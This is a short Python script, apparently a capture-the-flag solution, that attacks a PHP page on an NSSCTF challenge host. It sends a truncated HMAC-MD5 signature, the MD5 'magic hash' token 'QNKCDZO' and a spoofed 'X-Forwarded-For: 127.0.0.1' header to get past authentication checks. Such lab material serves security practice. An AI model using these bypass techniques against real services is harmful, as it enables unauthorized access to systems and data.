import requests
import time
import hmac
import hashlib
import base64

# 目标 URL（根据题目实际修改）
url = "http://node1.anna.nssctf.cn:21944/l34RNpHP.php"

# 固定参数
user = "test"
token = "QNKCDZO"
nonce = base64.b64encode(b"abc").decode()  # 例如 "YWJj"
key = "NULL"

# 当前时间戳
ts = int(time.time())

# 计算 HMAC-MD5
message = f"{user}{token}{ts}".encode()
mac = hmac.new(key.encode(), message, hashlib.md5).hexdigest()
sig = mac[:6]

# 构造请求参数
params = {
    "user": user,
    "token": token,
    "sig": sig,
    "ts": ts,
    "nonce": nonce
}

headers = {
    "X-Forwarded-For": "127.0.0.1"
}

# 发送请求
resp = requests.get(url, params=params, headers=headers)
print(resp.text)
